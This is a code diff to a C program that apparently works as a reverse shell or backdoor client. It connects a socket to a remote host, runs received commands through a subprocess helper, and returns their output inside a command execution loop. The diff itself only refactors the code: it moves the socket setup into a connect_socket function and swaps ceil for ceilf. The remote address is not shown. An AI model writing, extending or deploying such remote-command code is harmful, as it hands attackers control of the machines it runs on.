@@ -29,7 +29,7 @@ char* exec_subproc(char* command){
     char output_buffer[readbuffersize];
     while((fgets(output_buffer, sizeof(output_buffer), fptr)) != NULL) {
         if(outputSize - length_counter < readbuffersize) {
-            outputSize = (int) ceil(outputSize * growthfactor);
+            outputSize = (int) ceilf(outputSize * growthfactor);
             output = realloc(output, outputSize);
         }
 
@@ -78,7 +78,7 @@ char* execute(char* command) {
     return output_string;
 }
 
-int main(void) {
+int connect_socket(void) {
     int sock_ret;
     struct sockaddr_in sock;
 
@@ -99,6 +99,12 @@ int main(void) {
         printf("Could not connect to remote\n");
         return -1;
     }
+    
+    return sock_ret;
+}
+
+int main(void) {
+    int sock_ret = connect_socket();
 
     // Command execution loop
     while(1) {
